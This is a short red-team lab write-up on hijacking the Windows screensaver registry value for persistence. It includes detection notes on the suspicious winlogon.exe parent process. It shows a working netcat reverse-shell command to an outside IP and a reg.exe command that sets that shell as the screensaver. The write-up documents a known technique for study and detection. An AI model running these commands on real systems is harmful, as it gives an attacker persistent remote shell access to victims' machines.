# Screensaver Hijack

## Screensaver Hijack

### Execution

To achieve persistence, the attacker can modify `SCRNSAVE.EXE` value in the registry `HKCU\Control Panel\Desktop\` and change its data to point to any malicious file.

In this test, I will use a netcat reverse shell as my malicious payload:

{% code title="c:\shell.cmd\@victim" %}
```csharp
C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
```
{% endcode %}

Let's update the registry:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJ3FKFsaYJNr5Xp8EhD%2F-LJ3FfrqwTiqdXKoj0if%2Fscreensaver-registry.png?alt=media\&token=f3e75a81-6b3d-4790-b08c-7bb94c91f1b7)

The same could be achieved using a native Windows binary reg.exe:

{% code title="attacker\@victim" %}
```bash
reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d c:\shell.cmd
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJ3FKFsaYJNr5Xp8EhD%2F-LJ3HryqjxDQX3gMPmez%2Fscreensaver-reg.png?alt=media\&token=28fa21dd-98ca-4008-9552-db4f69c39e67)

### Observations

Note the process ancestry on the victim system - the reverse shell process traces back to winlogon.exe as the parent process, which is responsible for managing user logons/logoffs. This is highly suspect and should warrant a further investigation:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJ3FKFsaYJNr5Xp8EhD%2F-LJ3FmqTrOH0Vm4yfjik%2Fscreensaver-shell.png?alt=media\&token=0727f911-148c-4f55-9b1d-2d54c558ca03)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJ3N7v8JynVu8pAZ_zo%2F-LJ3NAYVyAx90FHdqEBg%2Fscreensaver-logs.png?alt=media\&token=834eba54-d481-4e00-9521-c2f7649ba889)

### References

{% embed url="https://attack.mitre.org/wiki/Technique/T1180" %}
